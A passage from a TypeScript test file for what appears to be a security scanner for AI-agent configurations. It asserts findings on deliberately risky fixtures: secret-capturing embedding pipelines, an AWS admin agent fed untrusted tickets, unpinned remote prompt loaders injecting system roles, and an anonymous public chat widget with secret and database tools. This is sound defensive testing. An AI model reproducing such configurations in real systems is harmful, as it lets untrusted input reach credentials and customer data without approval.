      ai_embedding_sensitive_capture: true,
      ai_embedding_secret_capture: true,
      ai_embedding_redaction_disabled: true,
      ai_embedding_untrusted_input: true,
      ai_embedding_approval_required: false
    });
    expect(runtimeEmbeddingFindings[0]?.matched_object.metadata.ai_embedding_capture_categories).toEqual([
      "browser_context",
      "document_context",
      "memory_context",
      "pii_data",
      "prompt_context",
      "retrieval_context",
      "secret_material",
      "tool_output"
    ]);
    expect(runtimeEmbeddingFindings[0]?.severity).toBe("critical");
    expect(runtimeEmbeddingFindings[0]?.confidence).toBe("very_high");
    expect(runtimeEmbeddingFindings[0]?.recommended_control).toBe("redact");
    expect(JSON.stringify(runtimeEmbeddingFindings[0])).not.toContain("${EMBEDDING_API_KEY}");
    expect(JSON.stringify(runtimeEmbeddingFindings[0])).not.toContain("api.openai.example.invalid");
    expect(JSON.stringify(runtimeEmbeddingFindings[0])).not.toContain("text-embedding-3-large");
    expect(JSON.stringify(runtimeEmbeddingFindings[0])).not.toContain("vector-index.example.invalid");
    expect(JSON.stringify(runtimeEmbeddingFindings[0])).not.toContain("customer-support-embeddings");
    expect(JSON.stringify(runtimeEmbeddingFindings[0])).not.toContain("untrusted_customer_ticket");
    expect(JSON.stringify(runtimeEmbeddingFindings[0])).not.toContain("retrieved_customer_context");
    expect(JSON.stringify(runtimeEmbeddingFindings[0])).not.toContain("browser_tool_output");
    expect(JSON.stringify(runtimeEmbeddingFindings[0])).not.toContain("support_memory_summary");
    const runtimeEmbeddingRetentionFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-087");
    expect(runtimeEmbeddingRetentionFindings).toHaveLength(1);
    expect(runtimeEmbeddingRetentionFindings[0]?.matched_object.path).toBe("embeddings/rag-indexer.yaml");
    expect(runtimeEmbeddingRetentionFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_ai_embedding_pipeline_config: true,
      ai_embedding_provider: "openai",
      ai_embedding_remote_provider: true,
      ai_embedding_vector_write_enabled: true,
      ai_embedding_auto_sync: true,
      ai_embedding_document_capture: true,
      ai_embedding_prompt_capture: true,
      ai_embedding_tool_output_capture: true,
      ai_embedding_retrieval_capture: true,
      ai_embedding_memory_capture: true,
      ai_embedding_browser_capture: true,
      ai_embedding_secret_capture: true,
      ai_embedding_pii_capture: true,
      ai_embedding_untrusted_input: true,
      ai_embedding_redaction_disabled: true,
      ai_embedding_retention_enabled: true,
      ai_embedding_approval_required: false
    });
    expect(runtimeEmbeddingRetentionFindings[0]?.matched_object.metadata.ai_embedding_capture_categories).toEqual([
      "browser_context",
      "document_context",
      "memory_context",
      "pii_data",
      "prompt_context",
      "retrieval_context",
      "secret_material",
      "tool_output"
    ]);
    expect(runtimeEmbeddingRetentionFindings[0]?.severity).toBe("critical");
    expect(runtimeEmbeddingRetentionFindings[0]?.confidence).toBe("very_high");
    expect(runtimeEmbeddingRetentionFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeEmbeddingRetentionFindings[0])).not.toContain("${EMBEDDING_API_KEY}");
    expect(JSON.stringify(runtimeEmbeddingRetentionFindings[0])).not.toContain("api.openai.example.invalid");
    expect(JSON.stringify(runtimeEmbeddingRetentionFindings[0])).not.toContain("text-embedding-3-large");
    expect(JSON.stringify(runtimeEmbeddingRetentionFindings[0])).not.toContain("vector-index.example.invalid");
    expect(JSON.stringify(runtimeEmbeddingRetentionFindings[0])).not.toContain("customer-support-embeddings");
    expect(JSON.stringify(runtimeEmbeddingRetentionFindings[0])).not.toContain("untrusted_customer_ticket");
    expect(JSON.stringify(runtimeEmbeddingRetentionFindings[0])).not.toContain("retrieved_customer_context");
    expect(JSON.stringify(runtimeEmbeddingRetentionFindings[0])).not.toContain("browser_tool_output");
    expect(JSON.stringify(runtimeEmbeddingRetentionFindings[0])).not.toContain("support_memory_summary");
    const runtimeCloudControlPlaneFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-032");
    expect(runtimeCloudControlPlaneFindings).toHaveLength(1);
    expect(runtimeCloudControlPlaneFindings[0]?.matched_object.path).toBe("cloud/aws-admin-agent.yaml");
    expect(runtimeCloudControlPlaneFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_cloud_control_plane_config: true,
      cloud_provider: "aws",
      cloud_control_plane_remote: true,
      cloud_control_plane_broad_scope: true,
      cloud_control_plane_admin_scope: true,
      cloud_control_plane_iam_write: true,
      cloud_control_plane_secret_access: true,
      cloud_control_plane_compute_write: true,
      cloud_control_plane_untrusted_input: true,
      cloud_control_plane_approval_required: false
    });
    expect(runtimeCloudControlPlaneFindings[0]?.matched_object.metadata.cloud_control_plane_scope_categories).toEqual([
      "admin_scope",
      "audit_log_read",
      "compute_write",
      "iam_write",
      "secret_read",
      "secret_write",
      "storage_write",
      "write_scope"
    ]);
    expect(runtimeCloudControlPlaneFindings[0]?.matched_object.metadata.cloud_control_plane_tool_authority_categories).toEqual([
      "aws_cli",
      "iac_apply"
    ]);
    expect(runtimeCloudControlPlaneFindings[0]?.severity).toBe("critical");
    expect(runtimeCloudControlPlaneFindings[0]?.confidence).toBe("very_high");
    expect(runtimeCloudControlPlaneFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeCloudControlPlaneFindings[0])).not.toContain("${AWS_ACCESS_KEY_ID}");
    expect(JSON.stringify(runtimeCloudControlPlaneFindings[0])).not.toContain("${AWS_SECRET_ACCESS_KEY}");
    expect(JSON.stringify(runtimeCloudControlPlaneFindings[0])).not.toContain("${AWS_SESSION_TOKEN}");
    expect(JSON.stringify(runtimeCloudControlPlaneFindings[0])).not.toContain("123456789012");
    expect(JSON.stringify(runtimeCloudControlPlaneFindings[0])).not.toContain("arn:aws:iam");
    expect(JSON.stringify(runtimeCloudControlPlaneFindings[0])).not.toContain("support-agent-admin");
    expect(JSON.stringify(runtimeCloudControlPlaneFindings[0])).not.toContain("AdministratorAccess");
    expect(JSON.stringify(runtimeCloudControlPlaneFindings[0])).not.toContain("iam:PassRole");
    expect(JSON.stringify(runtimeCloudControlPlaneFindings[0])).not.toContain("s3:PutObject");
    expect(JSON.stringify(runtimeCloudControlPlaneFindings[0])).not.toContain("untrusted_customer_ticket");
    expect(JSON.stringify(runtimeCloudControlPlaneFindings[0])).not.toContain("retrieved_cloud_runbook");
    expect(JSON.stringify(runtimeCloudControlPlaneFindings[0])).not.toContain("aws-cli");
    expect(JSON.stringify(runtimeCloudControlPlaneFindings[0])).not.toContain("terraform-apply");
    const runtimeCloudAutoRemediationFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-082"
    );
    expect(runtimeCloudAutoRemediationFindings).toHaveLength(1);
    expect(runtimeCloudAutoRemediationFindings[0]?.matched_object.path).toBe("cloud/aws-admin-agent.yaml");
    expect(runtimeCloudAutoRemediationFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_cloud_control_plane_config: true,
      cloud_provider: "aws",
      cloud_control_plane_remote: true,
      cloud_control_plane_broad_scope: true,
      cloud_control_plane_admin_scope: true,
      cloud_control_plane_iam_write: true,
      cloud_control_plane_secret_access: true,
      cloud_control_plane_secret_write: true,
      cloud_control_plane_storage_write: true,
      cloud_control_plane_compute_write: true,
      cloud_control_plane_delete_authority: true,
      cloud_control_plane_audit_log_access: true,
      cloud_control_plane_auto_remediation: true,
      cloud_control_plane_untrusted_input: true,
      cloud_control_plane_approval_required: false
    });
    expect(runtimeCloudAutoRemediationFindings[0]?.matched_object.metadata.cloud_control_plane_scope_categories).toEqual([
      "admin_scope",
      "audit_log_read",
      "compute_write",
      "iam_write",
      "secret_read",
      "secret_write",
      "storage_write",
      "write_scope"
    ]);
    expect(
      runtimeCloudAutoRemediationFindings[0]?.matched_object.metadata.cloud_control_plane_tool_authority_categories
    ).toEqual(["aws_cli", "iac_apply"]);
    expect(runtimeCloudAutoRemediationFindings[0]?.severity).toBe("critical");
    expect(runtimeCloudAutoRemediationFindings[0]?.confidence).toBe("very_high");
    expect(runtimeCloudAutoRemediationFindings[0]?.recommended_control).toBe("deny");
    expect(JSON.stringify(runtimeCloudAutoRemediationFindings[0])).not.toContain("${AWS_ACCESS_KEY_ID}");
    expect(JSON.stringify(runtimeCloudAutoRemediationFindings[0])).not.toContain("${AWS_SECRET_ACCESS_KEY}");
    expect(JSON.stringify(runtimeCloudAutoRemediationFindings[0])).not.toContain("${AWS_SESSION_TOKEN}");
    expect(JSON.stringify(runtimeCloudAutoRemediationFindings[0])).not.toContain("123456789012");
    expect(JSON.stringify(runtimeCloudAutoRemediationFindings[0])).not.toContain("arn:aws:iam");
    expect(JSON.stringify(runtimeCloudAutoRemediationFindings[0])).not.toContain("support-agent-admin");
    expect(JSON.stringify(runtimeCloudAutoRemediationFindings[0])).not.toContain("support-remediation-agent");
    expect(JSON.stringify(runtimeCloudAutoRemediationFindings[0])).not.toContain("AdministratorAccess");
    expect(JSON.stringify(runtimeCloudAutoRemediationFindings[0])).not.toContain("iam:PassRole");
    expect(JSON.stringify(runtimeCloudAutoRemediationFindings[0])).not.toContain("secretsmanager:PutSecretValue");
    expect(JSON.stringify(runtimeCloudAutoRemediationFindings[0])).not.toContain("s3:PutObject");
    expect(JSON.stringify(runtimeCloudAutoRemediationFindings[0])).not.toContain("lambda:UpdateFunctionCode");
    expect(JSON.stringify(runtimeCloudAutoRemediationFindings[0])).not.toContain("untrusted_customer_ticket");
    expect(JSON.stringify(runtimeCloudAutoRemediationFindings[0])).not.toContain("retrieved_cloud_runbook");
    expect(JSON.stringify(runtimeCloudAutoRemediationFindings[0])).not.toContain("aws-cli");
    expect(JSON.stringify(runtimeCloudAutoRemediationFindings[0])).not.toContain("terraform-apply");
    const runtimeAgentCspPolicyFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-034");
    expect(runtimeAgentCspPolicyFindings).toHaveLength(1);
    expect(runtimeAgentCspPolicyFindings[0]?.matched_object.path).toBe("agentcsp.yaml");
    expect(runtimeAgentCspPolicyFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agentcsp_policy_config: true,
      agentcsp_policy_trust_override_count: 1,
      agentcsp_policy_marks_untrusted_context_trusted: true,
      agentcsp_policy_suppression_count: 1,
      agentcsp_policy_broad_suppression: true,
      agentcsp_policy_high_severity_suppression: true,
      agentcsp_policy_long_lived_suppression: true,
      agentcsp_policy_recommended_control_count: 1,
      agentcsp_policy_recommended_control_downgrade: true,
      agentcsp_policy_weakens_security_controls: true
    });
    expect(runtimeAgentCspPolicyFindings[0]?.matched_object.metadata.agentcsp_policy_trust_override_kinds).toEqual([
      "broad_trust_override",
      "trust_elevation",
      "untrusted_context_trusted"
    ]);
    expect(runtimeAgentCspPolicyFindings[0]?.matched_object.metadata.agentcsp_policy_recommended_control_downgrade_kinds).toEqual([
      "allow_broad_match",
      "allow_critical",
      "allow_sensitive_scope"
    ]);
    expect(runtimeAgentCspPolicyFindings[0]?.severity).toBe("critical");
    expect(runtimeAgentCspPolicyFindings[0]?.confidence).toBe("very_high");
    expect(runtimeAgentCspPolicyFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeAgentCspPolicyFindings[0])).not.toContain("rag/**");
    expect(JSON.stringify(runtimeAgentCspPolicyFindings[0])).not.toContain("allow-critical-legacy-agent");
    expect(JSON.stringify(runtimeAgentCspPolicyFindings[0])).not.toContain("suppress-critical-legacy-agent");
    expect(JSON.stringify(runtimeAgentCspPolicyFindings[0])).not.toContain("security@example.com");
    expect(JSON.stringify(runtimeAgentCspPolicyFindings[0])).not.toContain("legacy_agent_security");
    expect(JSON.stringify(runtimeAgentCspPolicyFindings[0])).not.toContain("Fixture demonstrates risky");
    const runtimePromptRegistryFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-035");
    expect(runtimePromptRegistryFindings).toHaveLength(1);
    expect(runtimePromptRegistryFindings[0]?.matched_object.path).toBe("prompt-registry/remote-prompts.yaml");
    expect(runtimePromptRegistryFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_prompt_registry_config: true,
      agent_prompt_registry_provider: "agent_prompt_registry",
      agent_prompt_registry_remote: true,
      agent_prompt_registry_auto_sync_enabled: true,
      agent_prompt_registry_unpinned_reference: true,
      agent_prompt_registry_signature_verification_disabled: true,
      agent_prompt_registry_provenance_verification_missing: true,
      agent_prompt_registry_untrusted_selector: true,
      agent_prompt_registry_privileged_role_injection: true,
      agent_prompt_registry_tool_directive: true,
      agent_prompt_registry_approval_required: false
    });
    expect(runtimePromptRegistryFindings[0]?.matched_object.metadata.agent_prompt_registry_prompt_kinds).toEqual([
      "developer_prompt",
      "prompt_template",
      "runbook",
      "system_prompt",
      "tool_instruction"
    ]);
    expect(runtimePromptRegistryFindings[0]?.severity).toBe("critical");
    expect(runtimePromptRegistryFindings[0]?.confidence).toBe("very_high");
    expect(runtimePromptRegistryFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimePromptRegistryFindings[0])).not.toContain("${PROMPT_REGISTRY_TOKEN}");
    expect(JSON.stringify(runtimePromptRegistryFindings[0])).not.toContain("prompts.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimePromptRegistryFindings[0])).not.toContain("customer-escalation-system-vLatest");
    expect(JSON.stringify(runtimePromptRegistryFindings[0])).not.toContain("support-agent-developer-policy");
    expect(JSON.stringify(runtimePromptRegistryFindings[0])).not.toContain("customer_requested_prompt");
    expect(JSON.stringify(runtimePromptRegistryFindings[0])).not.toContain("prompt_registry_customer_email");
    expect(JSON.stringify(runtimePromptRegistryFindings[0])).not.toContain("confidential_prompt_context");
    expect(JSON.stringify(runtimePromptRegistryFindings[0])).not.toContain("support_db.update_customer_record");
    const runtimeRemoteInstructionFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-067");
    expect(runtimeRemoteInstructionFindings).toHaveLength(1);
    expect(runtimeRemoteInstructionFindings[0]?.matched_object.path).toBe("instruction-loader/remote-instructions.yaml");
    expect(runtimeRemoteInstructionFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_remote_instruction_loader_config: true,
      agent_remote_instruction_provider: "remote_instruction_loader",
      agent_remote_instruction_remote: true,
      agent_remote_instruction_auto_refresh_enabled: true,
      agent_remote_instruction_unpinned_reference: true,
      agent_remote_instruction_signature_verification_disabled: true,
      agent_remote_instruction_provenance_verification_missing: true,
      agent_remote_instruction_untrusted_selector: true,
      agent_remote_instruction_privileged_role_injection: true,
      agent_remote_instruction_privileged_tool_authority: true,
      agent_remote_instruction_approval_required: false
    });
    expect(runtimeRemoteInstructionFindings[0]?.matched_object.metadata.agent_remote_instruction_role_categories).toEqual([
      "developer_instruction",
      "system_instruction",
      "tool_instruction"
    ]);
    expect(runtimeRemoteInstructionFindings[0]?.matched_object.metadata.agent_remote_instruction_tool_authority_categories).toEqual([
      "browser_action",
      "database_access",
      "external_response",
      "memory_write",
      "secret_manager_access"
    ]);
    expect(runtimeRemoteInstructionFindings[0]?.severity).toBe("critical");
    expect(runtimeRemoteInstructionFindings[0]?.confidence).toBe("very_high");
    expect(runtimeRemoteInstructionFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeRemoteInstructionFindings[0])).not.toContain("${REMOTE_INSTRUCTION_TOKEN}");
    expect(JSON.stringify(runtimeRemoteInstructionFindings[0])).not.toContain("instructions.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeRemoteInstructionFindings[0])).not.toContain("customer-escalation-system-latest");
    expect(JSON.stringify(runtimeRemoteInstructionFindings[0])).not.toContain("support-agent-developer-runtime");
    expect(JSON.stringify(runtimeRemoteInstructionFindings[0])).not.toContain("customer_requested_instruction");
    expect(JSON.stringify(runtimeRemoteInstructionFindings[0])).not.toContain("remote_instruction_customer_email");
    expect(JSON.stringify(runtimeRemoteInstructionFindings[0])).not.toContain("confidential_remote_instruction_notes");
    expect(JSON.stringify(runtimeRemoteInstructionFindings[0])).not.toContain("support_db.update_customer_record");
    const runtimeRemoteInstructionSecretToolFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-103"
    );
    expect(runtimeRemoteInstructionSecretToolFindings).toHaveLength(1);
    expect(runtimeRemoteInstructionSecretToolFindings[0]?.matched_object.path).toBe(
      "instruction-loader/remote-instructions.yaml"
    );
    expect(runtimeRemoteInstructionSecretToolFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_remote_instruction_loader_config: true,
      agent_remote_instruction_provider: "remote_instruction_loader",
      agent_remote_instruction_remote: true,
      agent_remote_instruction_system_role: true,
      agent_remote_instruction_developer_role: true,
      agent_remote_instruction_auto_refresh_enabled: true,
      agent_remote_instruction_unpinned_reference: true,
      agent_remote_instruction_signature_verification_disabled: true,
      agent_remote_instruction_provenance_verification_missing: true,
      agent_remote_instruction_untrusted_selector: true,
      agent_remote_instruction_privileged_role_injection: true,
      agent_remote_instruction_privileged_tool_authority: true,
      agent_remote_instruction_write_authority: true,
      agent_remote_instruction_external_authority: true,
      agent_remote_instruction_memory_write: true,
      agent_remote_instruction_secret_access: true,
      agent_remote_instruction_sensitive_context: true,
      agent_remote_instruction_pii_context: true,
      agent_remote_instruction_approval_required: false
    });
    expect(
      runtimeRemoteInstructionSecretToolFindings[0]?.matched_object.metadata
        .agent_remote_instruction_tool_authority_categories
    ).toEqual(["browser_action", "database_access", "external_response", "memory_write", "secret_manager_access"]);
    expect(runtimeRemoteInstructionSecretToolFindings[0]?.matched_object.data_classes).toContain("credential");
    expect(runtimeRemoteInstructionSecretToolFindings[0]?.matched_object.secret_exposure).toBe(true);
    expect(runtimeRemoteInstructionSecretToolFindings[0]?.matched_object.untrusted_to_privileged).toBe(true);
    expect(runtimeRemoteInstructionSecretToolFindings[0]?.severity).toBe("critical");
    expect(runtimeRemoteInstructionSecretToolFindings[0]?.confidence).toBe("very_high");
    expect(runtimeRemoteInstructionSecretToolFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeRemoteInstructionSecretToolFindings[0])).not.toContain("${REMOTE_INSTRUCTION_TOKEN}");
    expect(JSON.stringify(runtimeRemoteInstructionSecretToolFindings[0])).not.toContain(
      "instructions.agentcsp-demo.example.invalid"
    );
    expect(JSON.stringify(runtimeRemoteInstructionSecretToolFindings[0])).not.toContain(
      "customer-escalation-system-latest"
    );
    expect(JSON.stringify(runtimeRemoteInstructionSecretToolFindings[0])).not.toContain(
      "support-agent-developer-runtime"
    );
    expect(JSON.stringify(runtimeRemoteInstructionSecretToolFindings[0])).not.toContain(
      "customer_requested_instruction"
    );
    expect(JSON.stringify(runtimeRemoteInstructionSecretToolFindings[0])).not.toContain("untrusted_customer_ticket");
    expect(JSON.stringify(runtimeRemoteInstructionSecretToolFindings[0])).not.toContain(
      "retrieved_customer_context"
    );
    expect(JSON.stringify(runtimeRemoteInstructionSecretToolFindings[0])).not.toContain("browser_tool_output");
    expect(JSON.stringify(runtimeRemoteInstructionSecretToolFindings[0])).not.toContain(
      "remote_instruction_customer_email"
    );
    expect(JSON.stringify(runtimeRemoteInstructionSecretToolFindings[0])).not.toContain(
      "remote_instruction_account_number"
    );
    expect(JSON.stringify(runtimeRemoteInstructionSecretToolFindings[0])).not.toContain(
      "confidential_remote_instruction_notes"
    );
    expect(JSON.stringify(runtimeRemoteInstructionSecretToolFindings[0])).not.toContain(
      "support_memory.remote_instruction_summary"
    );
    expect(JSON.stringify(runtimeRemoteInstructionSecretToolFindings[0])).not.toContain(
      "support_db.update_customer_record"
    );
    expect(JSON.stringify(runtimeRemoteInstructionSecretToolFindings[0])).not.toContain(
      "browser.submit_customer_form"
    );
    expect(JSON.stringify(runtimeRemoteInstructionSecretToolFindings[0])).not.toContain(
      "vault_secret_lookup.read_support_token"
    );
    expect(JSON.stringify(runtimeRemoteInstructionSecretToolFindings[0])).not.toContain("slack.post_customer_reply");
    const runtimeAgentExposureFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-036");
    expect(runtimeAgentExposureFindings).toHaveLength(1);
    expect(runtimeAgentExposureFindings[0]?.matched_object.path).toBe(".well-known/agent-card.json");
    expect(runtimeAgentExposureFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_exposure_config: true,
      agent_exposure_provider: "a2a_agent_card",
      agent_exposure_public_discovery: true,
      agent_exposure_anonymous_access: true,
      agent_exposure_external_callers: true,
      agent_exposure_tool_invocation_enabled: true,
      agent_exposure_privileged_authority: true,
      agent_exposure_rate_limit_missing: true,
      agent_exposure_approval_required: false
    });
    expect(runtimeAgentExposureFindings[0]?.matched_object.metadata.agent_exposure_tool_authority_categories).toEqual([
      "browser_action",
      "database_access",
      "external_response",
      "memory_access",
      "secret_manager_access",
      "tool_call"
    ]);
    expect(runtimeAgentExposureFindings[0]?.severity).toBe("critical");
    expect(runtimeAgentExposureFindings[0]?.confidence).toBe("very_high");
    expect(runtimeAgentExposureFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeAgentExposureFindings[0])).not.toContain("${A2A_AGENT_TOKEN}");
    expect(JSON.stringify(runtimeAgentExposureFindings[0])).not.toContain("support-agent.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeAgentExposureFindings[0])).not.toContain("support-case-remediation-agent");
    expect(JSON.stringify(runtimeAgentExposureFindings[0])).not.toContain("customer-record-update");
    expect(JSON.stringify(runtimeAgentExposureFindings[0])).not.toContain("credential-assisted-remediation");
    expect(JSON.stringify(runtimeAgentExposureFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeAgentExposureFindings[0])).not.toContain("a2a_customer_email");
    expect(JSON.stringify(runtimeAgentExposureFindings[0])).not.toContain("confidential_a2a_case_notes");
    const runtimeAgentCardCallbackSecretFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-114");
    expect(runtimeAgentCardCallbackSecretFindings).toHaveLength(1);
    expect(runtimeAgentCardCallbackSecretFindings[0]?.matched_object.path).toBe(".well-known/agent-card.json");
    expect(runtimeAgentCardCallbackSecretFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_exposure_config: true,
      agent_exposure_provider: "a2a_agent_card",
      agent_exposure_public_discovery: true,
      agent_exposure_auth_disabled: true,
      agent_exposure_anonymous_access: true,
      agent_exposure_external_callers: true,
      agent_exposure_tool_invocation_enabled: true,
      agent_exposure_privileged_authority: true,
      agent_exposure_write_authority: true,
      agent_exposure_memory_access: true,
      agent_exposure_secret_access: true,
      agent_exposure_callback_credential_reference: true,
      agent_exposure_rate_limit_missing: true,
      agent_exposure_approval_required: false
    });
    expect(runtimeAgentCardCallbackSecretFindings[0]?.matched_object.metadata.agent_exposure_tool_authority_categories).toEqual([
      "browser_action",
      "database_access",
      "external_response",
      "memory_access",
      "secret_manager_access",
      "tool_call"
    ]);
    expect(runtimeAgentCardCallbackSecretFindings[0]?.matched_object.data_classes).toEqual(["confidential", "credential", "pii", "secret"]);
    expect(runtimeAgentCardCallbackSecretFindings[0]?.matched_object.actions).toEqual([
      "call",
      "execute",
      "publish",
      "read",
      "remember",
      "send",
      "write"
    ]);
    expect(runtimeAgentCardCallbackSecretFindings[0]?.severity).toBe("critical");
    expect(runtimeAgentCardCallbackSecretFindings[0]?.confidence).toBe("very_high");
    expect(runtimeAgentCardCallbackSecretFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeAgentCardCallbackSecretFindings[0])).not.toContain("${A2A_AGENT_TOKEN}");
    expect(JSON.stringify(runtimeAgentCardCallbackSecretFindings[0])).not.toContain("support-agent.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeAgentCardCallbackSecretFindings[0])).not.toContain("support-case-remediation-agent");
    expect(JSON.stringify(runtimeAgentCardCallbackSecretFindings[0])).not.toContain("customer-record-update");
    expect(JSON.stringify(runtimeAgentCardCallbackSecretFindings[0])).not.toContain("credential-assisted-remediation");
    expect(JSON.stringify(runtimeAgentCardCallbackSecretFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeAgentCardCallbackSecretFindings[0])).not.toContain("browser.submit_customer_form");
    expect(JSON.stringify(runtimeAgentCardCallbackSecretFindings[0])).not.toContain("slack.post_escalation_reply");
    expect(JSON.stringify(runtimeAgentCardCallbackSecretFindings[0])).not.toContain("vault_secret_lookup.read_support_token");
    expect(JSON.stringify(runtimeAgentCardCallbackSecretFindings[0])).not.toContain("support_memory_summary");
    expect(JSON.stringify(runtimeAgentCardCallbackSecretFindings[0])).not.toContain("public_agent_registry");
    expect(JSON.stringify(runtimeAgentCardCallbackSecretFindings[0])).not.toContain("partner_agents");
    expect(JSON.stringify(runtimeAgentCardCallbackSecretFindings[0])).not.toContain("a2a_customer_email");
    expect(JSON.stringify(runtimeAgentCardCallbackSecretFindings[0])).not.toContain("a2a_account_number");
    expect(JSON.stringify(runtimeAgentCardCallbackSecretFindings[0])).not.toContain("confidential_a2a_case_notes");
    const runtimePublicChatFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-062");
    expect(runtimePublicChatFindings).toHaveLength(1);
    expect(runtimePublicChatFindings[0]?.matched_object.path).toBe("public-chat/support-widget.yaml");
    expect(runtimePublicChatFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_public_agent_chat_config: true,
      public_agent_chat_enabled: true,
      public_agent_chat_public_endpoint: true,
      public_agent_chat_anonymous_access: true,
      public_agent_chat_auth_disabled: true,
      public_agent_chat_cors_broad: true,
      public_agent_chat_rate_limit_missing: true,
      public_agent_chat_abuse_protection_disabled: true,
      public_agent_chat_untrusted_input: true,
      public_agent_chat_auto_tool_invocation: true,
      public_agent_chat_privileged_tool_authority: true,
      public_agent_chat_redaction_disabled: true,
      public_agent_chat_approval_required: false
    });
    expect(runtimePublicChatFindings[0]?.matched_object.metadata.public_agent_chat_tool_authority_categories).toEqual([
      "database_write",
      "external_response",
      "memory_write",
      "secret_manager_access",
      "tool_call"
    ]);
    expect(runtimePublicChatFindings[0]?.severity).toBe("critical");
    expect(runtimePublicChatFindings[0]?.confidence).toBe("very_high");
    expect(runtimePublicChatFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimePublicChatFindings[0])).not.toContain("${PUBLIC_CHAT_AGENT_TOKEN}");
    expect(JSON.stringify(runtimePublicChatFindings[0])).not.toContain("support.example.invalid");
    expect(JSON.stringify(runtimePublicChatFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimePublicChatFindings[0])).not.toContain("slack.post_customer_reply");
    expect(JSON.stringify(runtimePublicChatFindings[0])).not.toContain("vault_secret_lookup.read_support_token");
    expect(JSON.stringify(runtimePublicChatFindings[0])).not.toContain("memory.write_customer_summary");
    expect(JSON.stringify(runtimePublicChatFindings[0])).not.toContain("anonymous_website_visitor");
    expect(JSON.stringify(runtimePublicChatFindings[0])).not.toContain("public_chat_customer_email");
    expect(JSON.stringify(runtimePublicChatFindings[0])).not.toContain("confidential_public_chat_notes");
    const runtimePublicChatUploadFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-092");
    expect(runtimePublicChatUploadFindings).toHaveLength(1);
    expect(runtimePublicChatUploadFindings[0]?.matched_object.path).toBe("public-chat/support-widget.yaml");
    expect(runtimePublicChatUploadFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_public_agent_chat_config: true,
      public_agent_chat_enabled: true,
      public_agent_chat_public_endpoint: true,
      public_agent_chat_anonymous_access: true,
      public_agent_chat_auth_disabled: true,
      public_agent_chat_cors_broad: true,
      public_agent_chat_csrf_disabled: true,
      public_agent_chat_rate_limit_missing: true,
      public_agent_chat_abuse_protection_disabled: true,
      public_agent_chat_file_upload_enabled: true,
      public_agent_chat_untrusted_input: true,
      public_agent_chat_auto_tool_invocation: true,
      public_agent_chat_write_authority: true,
      public_agent_chat_external_response: true,
      public_agent_chat_memory_write: true,
      public_agent_chat_secret_access: true,
      public_agent_chat_sensitive_context: true,
      public_agent_chat_pii_context: true,
      public_agent_chat_redaction_disabled: true,
      public_agent_chat_approval_required: false
    });
    expect(runtimePublicChatUploadFindings[0]?.matched_object.metadata.public_agent_chat_tool_authority_categories).toEqual([
      "database_write",
      "external_response",
      "memory_write",
      "secret_manager_access",
      "tool_call"
    ]);
    expect(runtimePublicChatUploadFindings[0]?.severity).toBe("critical");
    expect(runtimePublicChatUploadFindings[0]?.confidence).toBe("very_high");
    expect(runtimePublicChatUploadFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimePublicChatUploadFindings[0])).not.toContain("${PUBLIC_CHAT_AGENT_TOKEN}");
    expect(JSON.stringify(runtimePublicChatUploadFindings[0])).not.toContain("support.example.invalid");
    expect(JSON.stringify(runtimePublicChatUploadFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimePublicChatUploadFindings[0])).not.toContain("slack.post_customer_reply");
    expect(JSON.stringify(runtimePublicChatUploadFindings[0])).not.toContain("vault_secret_lookup.read_support_token");
    expect(JSON.stringify(runtimePublicChatUploadFindings[0])).not.toContain("memory.write_customer_summary");
    expect(JSON.stringify(runtimePublicChatUploadFindings[0])).not.toContain("anonymous_website_visitor");
    expect(JSON.stringify(runtimePublicChatUploadFindings[0])).not.toContain("customer_uploaded_attachment");
    expect(JSON.stringify(runtimePublicChatUploadFindings[0])).not.toContain("public_chat_customer_email");
    expect(JSON.stringify(runtimePublicChatUploadFindings[0])).not.toContain("confidential_public_chat_notes");
    const runtimeDebugConsoleFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-063");
    expect(runtimeDebugConsoleFindings).toHaveLength(1);
    expect(runtimeDebugConsoleFindings[0]?.matched_object.path).toBe("debug/agent-playground.yaml");
